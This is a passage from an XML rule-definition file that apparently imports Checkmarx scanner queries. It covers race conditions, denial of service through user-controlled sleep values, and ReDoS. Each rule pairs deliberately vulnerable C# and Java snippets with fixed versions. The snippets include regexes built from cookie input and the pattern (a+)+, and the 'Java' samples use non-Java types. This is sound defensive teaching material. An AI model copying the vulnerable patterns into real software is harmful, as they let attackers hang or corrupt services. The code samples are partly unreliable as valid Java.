&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_496_Relationships" id="oc_496_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;485&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=485" target="_blank"&gt;Insufficient Encapsulation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_496_Taxonomy Mappings" id="oc_496_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Public Data Assigned to Private Array-Typed
Field&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="White Box Definitions"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;White Box Definitions&lt;/div&gt;&lt;div name="oc_496_White Box Definitions" id="oc_496_White Box Definitions" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;A weakness where code path has a statement that assigns a data item to a
private array field and the data item is public&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_496_Content History" id="oc_496_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Sean Eidemiller&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;added/updated demonstrative
examples&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-08-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;KDM Analytics&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;added/updated white box definitions&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Applicable Platforms, Relationships,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2732</key><name>Race_Condition</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;A&amp;nbsp;race condition can cause erratic or unexpected application behavior. Additionally, if a race condition&amp;nbsp;can be influenced directly by users, an attacker may choose to replay a race condition until they obtain a desired&amp;nbsp;result, allowing them to induce certain application behavior that is not part of its intentional design.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Concurrent instances, such as threads or servlets, can run concurrently. Failure to ensure all of their operations on a shared resource are done atomically and in a synchronized manner may result in threads overriding each other's actions or outputs. For example, a logical state&amp;nbsp;may have been validated prior to an update operation, but the update operation itself was only&amp;nbsp;performed after the previously validated state has changed due to code concurrency.&lt;/p&gt;
&lt;p class="MsoListParagraphCxSpLast" dir="LTR" style="margin: 0cm 0cm 8pt 36pt; text-indent: -18pt; direction: ltr; unicode-bidi: embed;"&gt;&lt;!-- [if !supportLists]--&gt;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Consider allocating independent&amp;nbsp;resources&amp;nbsp;for concurrent logical processes, unless required.&lt;/p&gt;
&lt;p&gt;Where resource sharing is required, utilize a locking mechanism when handling shared resources to ensure that actions are performed atomically by the current process, so that these logical processes&amp;nbsp;are not overridden or disrupted by any other concurrent process.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;ASPX Setting and Then Reading A Singleton Variable That May Have Been Set By Another Request&lt;/h4&gt;&lt;pre&gt;// Default.aspx.cs
using System;
using System.ComponentModel.DataAnnotations;
using System.Web.DynamicData;

public partial class _Default : System.Web.UI.Page {
    public static string secret = "None";
    protected void Page_Load(object sender, EventArgs e) {
        secret = Request.Params["secret"];
    }
}

// Default.aspx - the "secret" printed here may be different to the secret obtained and set from Request,
// if another user makes a request with a different "secret", writing a different "secret" altogether
&lt;%@ Page Language="C#" MasterPageFile="~/Site.master" CodeFile="Default.aspx.cs" Inherits="_Default" %&gt;
&lt;asp:Content ID="Content1" ContentPlaceHolderID="ContentPlaceHolder1" Runat="Server"&gt;
    &lt;%= secret %&gt; 
&lt;/asp:Content&gt;&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Threads Incrementing The Same Variable Without Locking&lt;/h4&gt;&lt;pre&gt;	public static class FooIncrement {
		static int foo = 0;
		static Object lock = new Object();
		public static int generateFoo() throws InterruptedException {
			IncrementFooThread[] threadArray = new IncrementFooThread[10000];
			for (int i = 0; i &lt; threadArray.length; i++) {
				threadArray[i] = new IncrementFooThread(); 
				threadArray[i].start();
			}
			for (IncrementFooThread threaderThread : threadArray) {
				threaderThread.join();
			}
			return foo;
		}
		public static class IncrementFooThread extends Thread {
			public void run() 
			{
				foo++; //two threads may separately read the same value of foo before any of them update it,
              		   //resulting in two threads setting the same value of foo
			}
			
		}
	}&lt;/pre&gt;&lt;h4&gt;Adding A Lock Object to Synchronize a Shared Resource&lt;/h4&gt;&lt;pre&gt;	public static class FooIncrement {
		static int foo = 0;
		static Object lock = new Object();
		public static int generateFoo() throws InterruptedException {
			IncrementFooThread[] threadArray = new IncrementFooThread[10000];
			for (int i = 0; i &lt; threadArray.length; i++) {
				threadArray[i] = new IncrementFooThread(); 
				threadArray[i].start();
			}
			for (IncrementFooThread threaderThread : threadArray) {
				threaderThread.join();
			}
			return foo;
		}
		public static class IncrementFooThread extends Thread {
			public void run() 
			{
				synchronized (lock) {
					foo++; //foo is atomically incremented
				}
			}
			
		}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2756</key><name>Race_Condition_Format_Flaw</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;At best, a Race Condition may&amp;nbsp;cause errors in accuracy, overidden values or unexpected behavior that may result in denial-of-service. At worst, it may allow attackers to retrieve data or bypass security processes by replaying a controllable Race Condition until it plays out in their favor.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Race Conditions occur when a public, single instance of a resource is used by multiple concurrent logical processes. If the these logical processes attempt to retrieve and update the resource without a timely management system, such as a lock, a Race Condition will occur.&lt;/p&gt;
&lt;p&gt;An example for when a Race Condition occurs is a resource that may return a certain value to a process for further editing, and then updated by a second&amp;nbsp;process, resulting in the original process' data no longer being valid. Once the original process edits and updates the incorrect value back into the resource, the second process' update has been overwritten and lost.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;When sharing resources between concurrent processes across the application ensure that these resources are&amp;nbsp;either thread-safe, or implement a locking mechanism to ensure expected concurrent activity.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Different Threads Increment and Decrement The Same Counter Repeatedly, Resulting in a Race Condition&lt;/h4&gt;&lt;pre&gt;	public static int counter = 0;	
	public static void start() throws InterruptedException { 
		incrementCounter ic;
		decrementCounter dc;
		while(counter == 0) {
			counter = 0;
			ic = new incrementCounter();
			dc = new decrementCounter();
			ic.start();
			dc.start();
			ic.join();
			dc.join();
		}
		System.out.println(counter); //Will stop and return either -1 or 1 due to race condition over counter
	}
	
	public static class incrementCounter extends Thread {
	    public void run() {
    		counter++;
	    }
	}
	
	public static class decrementCounter extends Thread {
	    public void run() {
    		counter--;
	    }
	}&lt;/pre&gt;&lt;h4&gt;Different Threads Increment and Decrement The Same Thread-Safe Counter Repeatedly, Never Resulting in a Race Condition&lt;/h4&gt;&lt;pre&gt;	public static int counter = 0;
	public static Object lock = new Object();
	
	public static void start() throws InterruptedException {
		incrementCounter ic;
		decrementCounter dc;
		while(counter == 0) { // because of proper locking, this condition is never false
			counter = 0;
			ic = new incrementCounter();
			dc = new decrementCounter();
			ic.start();
			dc.start();
			ic.join();
			dc.join();
		}
		System.out.println(counter); // Never reached
	}
	
	public static class incrementCounter extends Thread {
	    public void run() {
	    	synchronized (lock) {
	    		counter++;
	    	}
	    }
	}
	
	public static class decrementCounter extends Thread {
	    public void run() {
	    	synchronized (lock) {
	    		counter--;
	    	}
	    }
	}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_629</key><name>DoS_by_Sleep</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could provide a very high sleep value, effectively causing a denial of service for a long period of time.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application uses a user-provided value to set its sleep period, without enforcing a limited range for this value.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ol&gt;
&lt;li&gt;Ideally, the sleep command&amp;#8217;s duration should not be be according to user input at all. It should be either hardcoded, defined in a configuration file, or dynamically calculated at runtime.&lt;/li&gt;
&lt;li&gt;If it is necessary to allow the user to define the sleep duration, this value MUST be checked and enforced to be within a predefined range of valid values.&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
The application receives a timeout int from the user to be used as argument for Sleep(). This int could be a very big number.
      &lt;/h4&gt;&lt;pre&gt;

public class DosbySleep
{
        public void foo()
        {
                int sleep = int.Parse(HttpContext.Request.QueryString["timeout"]);
                Thread.Sleep(sleep);
        }
}



      &lt;/pre&gt;&lt;h4&gt;
The int received is varified to be in an acceptable range.
      &lt;/h4&gt;&lt;pre&gt;

public class DosbySleep
{
        public void foo()
        {
                int sleep = int.Parse(HttpContext.Request.QueryString["timeout"]);
                if (sleep &gt; 1000)
		{
			sleep = 1000;
		}
		else if (sleep &lt;= 10)
                {
                        sleep = 10;
                }
                Thread.Sleep(sleep);
        }
}



      &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_612</key><name>Potential_ReDoS</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div style="direction: ltr;"&gt;ReDoS (regular expression denial of service) can use complex patterns to cause a denial of service (DoS). With certain patterns, processing time can grow exponentially in relation to input size. An attacker can use these regular expressions&amp;#160;to&amp;#160;cause the application&amp;#160;to spend an effectively infinite amount of time processing, preventing legitmate users from accessing the application.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div style="direction: ltr;"&gt;ReDoS (regular expression denial of service) is an algorithmic complexity attack, that exploits exponential time worst case complexity. In particular, certain regex patterns - either explicitly coded in the application, or accepted from user input and used for searching&amp;#160;text&amp;#160;- can cause extreme levels of processing for some input texts. For example, `&lt;code&gt;(a+)+&lt;/code&gt;` would hang on an input of a long string of "aaaaaaaaaaaaaaaaaaaaaaaa!"&lt;/div&gt;
&lt;div style="direction: ltr;"&gt;&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Do not use input for constructing a regular expression.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Ensure all regexes are not vulnerable to ReDoS, specifically worst case complexity does not cause the application to hang.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Strive to avoid unnecessarily complex expressions, making them as simple as possible.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Validating date based on user-supplied format&lt;/h4&gt;&lt;pre&gt;
bool validateInput(HttpServletRequest req) {
    string startDate = req.getParameter("startDate");
    string endDate = req.getParameter("endDate");

    string format = readCookieByName(req, "dateFormat");
    
    if (startDate.matches(format) &amp;&amp; endDate.matches(format))
        return true;
    else 
        return false;
}
&lt;/pre&gt;&lt;h4&gt;Validating date based on server format&lt;/h4&gt;&lt;pre&gt;
bool validateInput(HttpServletRequest req) {
    string startDate = req.getParameter("startDate");
    string endDate = req.getParameter("endDate");

    // Constrain available formats to hardcoded list
    string style = readCookieByName(req, "dateStyle");
    string format;
    if (style == "YMD") 
        format = "^\d{4}-\d{2}-\d{2}";
    else 
        format = "^\d{2}-\d{2}-\d{4}";

    if (startDate.matches(format) &amp;&amp; endDate.matches(format))
        return true;
    else 
        return false;
}
&lt;/pre&gt;&lt;h4&gt;Checking for username in password with RegEx&lt;/h4&gt;&lt;pre&gt;bool validatePassword(HttpServletRequest req) {
    string username = req.getParameter("username");
    string password = req.getParameter("password");

    // Verifies password does not contain username
    if (password.matches(username))
        return false;
    else 
        return true;
}
&lt;/pre&gt;&lt;h4&gt;Checking for username in password without RegEx&lt;/h4&gt;&lt;pre&gt;bool validatePassword(HttpServletRequest req) {
    string username = req.getParameter("username");
    string password = req.getParameter("password");

    // Verifies password does not contain username
    if (password.contains(username))
        return false;
    else 
        return true;
}
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_613</key><name>Potential_ReDoS_By_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div style="direction: ltr;"&gt;ReDoS (regular expression denial of service) can use complex patterns to cause a denial of service (DoS). With certain patterns, processing time can grow exponentially in relation to input size. An attacker can use these regular expressions&amp;#160;to&amp;#160;cause the application&amp;#160;to spend an effectively infinite amount of time processing, preventing legitmate users from accessing the application.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div style="direction: ltr;"&gt;ReDoS (regular expression denial of service) is an algorithmic complexity attack, that exploits exponential time worst case complexity. In particular, certain regex patterns - either explicitly coded in the application, or accepted from user input and used for searching&amp;#160;text&amp;#160;- can cause extreme levels of processing for some input texts. For example, `&lt;code&gt;(a+)+&lt;/code&gt;` would hang on an input of a long string of "aaaaaaaaaaaaaaaaaaaaaaaa!"&lt;/div&gt;
&lt;div style="direction: ltr;"&gt;&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Do not use input for constructing a regular expression.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Ensure all regexes are not vulnerable to ReDoS, specifically worst case complexity does not cause the application to hang.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Strive to avoid unnecessarily complex expressions, making them as simple as possible.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Validating date based on user-supplied format&lt;/h4&gt;&lt;pre&gt;
bool validateInput(HttpServletRequest req) {
    string startDate = req.getParameter("startDate");
    string endDate = req.getParameter("endDate");

    string format = readCookieByName(req, "dateFormat");
    
    if (startDate.matches(format) &amp;&amp; endDate.matches(format))
        return true;
    else 
        return false;
}
&lt;/pre&gt;&lt;h4&gt;Validating date based on server format&lt;/h4&gt;&lt;pre&gt;
bool validateInput(HttpServletRequest req) {
    string startDate = req.getParameter("startDate");
    string endDate = req.getParameter("endDate");

    // Constrain available formats to hardcoded list
    string style = readCookieByName(req, "dateStyle");
    string format;
    if (style == "YMD") 
        format = "^\d{4}-\d{2}-\d{2}";
    else 
        format = "^\d{2}-\d{2}-\d{4}";

    if (startDate.matches(format) &amp;&amp; endDate.matches(format))
        return true;
    else 
        return false;
}
&lt;/pre&gt;&lt;h4&gt;Checking for username in password with RegEx&lt;/h4&gt;&lt;pre&gt;bool validatePassword(HttpServletRequest req) {
    string username = req.getParameter("username");
    string password = req.getParameter("password");

    // Verifies password does not contain username
    if (password.matches(username))
        return false;
    else 
        return true;
}
&lt;/pre&gt;&lt;h4&gt;Checking for username in password without RegEx&lt;/h4&gt;&lt;pre&gt;bool validatePassword(HttpServletRequest req) {
    string username = req.getParameter("username");
    string password = req.getParameter("password");

    // Verifies password does not contain username
    if (password.contains(username))
        return false;
    else 
        return true;
}
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_614</key><name>Potential_ReDoS_In_Match</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div style="direction: ltr;"&gt;ReDoS (regular expression denial of service) can use complex patterns to cause a denial of service (DoS). With certain patterns, processing time can grow exponentially in relation to input size. An attacker can use these regular expressions&amp;#160;to&amp;#160;cause the application&amp;#160;to spend an effectively infinite amount of time processing, preventing legitmate users from accessing the application.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div style="direction: ltr;"&gt;ReDoS (regular expression denial of service) is an algorithmic complexity attack, that exploits exponential time worst case complexity. In particular, certain regex patterns - either explicitly coded in the application, or accepted from user input and used for searching&amp;#160;text&amp;#160;- can cause extreme levels of processing for some input texts. For example, `&lt;code&gt;(a+)+&lt;/code&gt;` would hang on an input of a long string of "aaaaaaaaaaaaaaaaaaaaaaaa!"&lt;/div&gt;
&lt;div style="direction: ltr;"&gt;&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Do not use input for constructing a regular expression.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Ensure all regexes are not vulnerable to ReDoS, specifically worst case complexity does not cause the application to hang.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Strive to avoid unnecessarily complex expressions, making them as simple as possible.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Validating date based on user-supplied format&lt;/h4&gt;&lt;pre&gt;
bool validateInput(HttpServletRequest req) {
    string startDate = req.getParameter("startDate");
    string endDate = req.getParameter("endDate");

    string format = readCookieByName(req, "dateFormat");
    
    if (startDate.matches(format) &amp;&amp; endDate.matches(format))
        return true;
    else 
        return false;
}
&lt;/pre&gt;&lt;h4&gt;Validating date based on server format&lt;/h4&gt;&lt;pre&gt;
bool validateInput(HttpServletRequest req) {
    string startDate = req.getParameter("startDate");
    string endDate = req.getParameter("endDate");

    // Constrain available formats to hardcoded list
    string style = readCookieByName(req, "dateStyle");
    string format;
    if (style == "YMD") 
        format = "^\d{4}-\d{2}-\d{2}";
    else 
        format = "^\d{2}-\d{2}-\d{4}";

    if (startDate.matches(format) &amp;&amp; endDate.matches(format))
        return true;
    else 
        return false;
}
&lt;/pre&gt;&lt;h4&gt;Checking for username in password with RegEx&lt;/h4&gt;&lt;pre&gt;bool validatePassword(HttpServletRequest req) {
    string username = req.getParameter("username");
    string password = req.getParameter("password");

    // Verifies password does not contain username
    if (password.matches(username))
        return false;
    else 
        return true;
}
&lt;/pre&gt;&lt;h4&gt;Checking for username in password without RegEx&lt;/h4&gt;&lt;pre&gt;bool validatePassword(HttpServletRequest req) {
    string username = req.getParameter("username");
    string password = req.getParameter("password");

    // Verifies password does not contain username
    if (password.contains(username))
        return false;
    else 
        return true;
}
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_615</key><name>Potential_ReDoS_In_Replace</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div style="direction: ltr;"&gt;ReDoS (regular expression denial of service) can use complex patterns to cause a denial of service (DoS). With certain patterns, processing time can grow exponentially in relation to input size. An attacker can use these regular expressions&amp;#160;to&amp;#160;cause the application&amp;#160;to spend an effectively infinite amount of time processing, preventing legitmate users from accessing the application.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div style="direction: ltr;"&gt;ReDoS (regular expression denial of service) is an algorithmic complexity attack, that exploits exponential time worst case complexity. In particular, certain regex patterns - either explicitly coded in the application, or accepted from user input and used for searching&amp;#160;text&amp;#160;- can cause extreme levels of processing for some input texts. For example, `&lt;code&gt;(a+)+&lt;/code&gt;` would hang on an input of a long string of "aaaaaaaaaaaaaaaaaaaaaaaa!"&lt;/div&gt;
&lt;div style="direction: ltr;"&gt;&amp;#160;&lt;/div&gt;      
